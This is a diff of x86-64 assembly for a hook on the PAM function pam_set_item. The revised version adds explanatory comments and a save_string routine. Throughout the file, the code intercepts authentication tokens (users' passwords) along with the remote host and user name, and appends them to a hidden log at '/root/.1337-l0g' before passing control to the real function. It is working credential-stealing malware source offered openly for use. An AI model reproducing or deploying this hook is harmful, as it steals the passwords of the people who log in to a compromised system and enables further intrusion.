@@ -3,106 +3,121 @@
 %define sys_close 3
 
 %define O_CLOEXEC 0x80000
-%define O_APPEND  0x400
-%define O_CREAT   0x40
-%define O_RDWR    0x2
+%define O_APPEND    0x400
+%define O_CREAT      0x40
+%define O_RDWR        0x2
 
 %define PAM_AUTHTOK 6
 
 BITS 64
+; this will be replaced by the real function address
     pam_set_item: dq 0
+
+; pam_set_item(
+;    pam_handle_t *pamh, /* rdi */
+;    int item_type,      /* rsi */
+;    const void *item    /* rdx */
+; );
 _start:
+    ; check if item_type is an authentication token
     cmp rsi, PAM_AUTHTOK
     jne end
 
+    ; check if item isn't null
     test rdx, rdx
     je end
 
+    ; save original parameters
     push rdi
     push rsi
     push rdx
 
+    ; zeroing rdi, rdx, rax
     xor rdi, rdi
     mul rdi
 
+    ; open(filename, flags, 0644)
     mov al, sys_open
-    mov rsi, O_RDWR|O_CREAT|O_CLOEXEC|O_APPEND
     lea rdi, [rel filename]
+    mov rsi, O_RDWR|O_CREAT|O_CLOEXEC|O_APPEND
     mov dx, 0644
     syscall
+
+    ; check if file is opened
+    ; if(fd == -1)
+    ;     goto restore
+    test rax, rax
     js restore
 
-    push rax
+    ; save the fd
+    mov rdi, rax
 
-    mov rdi, [rsp+8]
-    call strlen
+    ; get *item* parameter
+    mov rsi, [rsp]
+    call save_string
 
-    xor rax, rax
-    mov al, sys_write
-    mov rdi, [rsp]
-    mov rsi, [rsp+8]
-    syscall
+    ; r9 = pahm
+    mov r9, [rsp+16]
 
-    ;;; 56      48
-    ;;; rhost - user
-
-    mov r10, [rsp+24]
-    xor r9, r9
-    mov r9, 56
-
-    jmp breakline
-
-    loop:
-    mov rsi, r10
-    add rsi, r9
+    ; get rhost (offset 56 at pahm struct)
+    lea rsi, [r9+56]
     mov rsi, [rsi]
-    test rsi, rsi
-    jz decr9
+    call save_string
 
-    mov rdi, rsi
-    call strlen
+    ; get user (offset 48 at pahm struct)
+    lea rsi, [r9+48]
+    mov rsi, [rsi]
+    call save_string
 
+    ; close the fd
     xor rax, rax
-    mov al, sys_write
-    mov rdi, [rsp]
+    mov al, sys_close
     syscall
 
-    decr9:
-    sub r9, 8
-
-    breakline:
-    xor rax, rax
-    xor rdx, rdx
-    mov al, sys_write
-    inc rdx
-    lea rsi, [rel bline]
-    syscall
-
-    cmp r9, 40
-    jne loop
-
-    ;;; end of loop
-
-    add rsp, 8
+    ; restore the original parameters
     restore:
     pop rdx
     pop rsi
     pop rdi
 
+    ; jmp to real function
     end:
     mov r10, [rel pam_set_item]
     jmp r10
 
-    filename: db '/root/.1337-l0g', 0x0
-    bline: db 0xa
+    ; output file, you can edit this
+    filename: db '/root/.1337-l0g'
+    nb: db 0x0
 
-strlen:
-    xor rcx, rcx
-    not rcx
-    xor al, al
-    cld
-    repne scasb
-    not rcx
-    dec rcx
-    mov rdx, rcx
+save_string:
+    xor rax, rax
+
+    test rsi, rsi
+    jz write_null
+
+    mov rdx, rsi
+
+    ; get string size
+    loop:
+    cmp [rdx], al
+    jz end_of_loop
+    inc rdx
+    jmp loop
+    end_of_loop:
+
+    ; increase length for write null-byte
+    inc rdx
+    sub rdx, rsi
+
+    write:
+    mov al, sys_write
+    syscall
+
     ret
+
+    ; write null-byte if parameter is a null pointer
+    write_null:
+    xor rdx, rdx
+    inc dl
+    lea rsi, [rel nb]
+    jmp write
